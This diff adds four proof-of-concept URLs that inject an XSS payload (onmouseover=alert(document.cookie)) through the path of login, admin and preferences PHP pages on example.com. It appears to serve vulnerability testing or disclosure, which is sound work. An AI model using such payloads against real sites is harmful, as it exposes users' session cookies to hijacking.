@@ -1,0 +1,4 @@
+http://www.example.com/login.php/%22onmouseover=alert%28document.cookie%29;%3E
+http://www.example.com/admin.php/%22onmouseover=alert%28document.cookie%29;%3E
+http://www.example.com/admin.php/%22onmouseover=alert%28document.cookie%29;%3E
+http://www.example.com/preferences.php/%22onmouseover=alert%28document.cookie%29;%3E
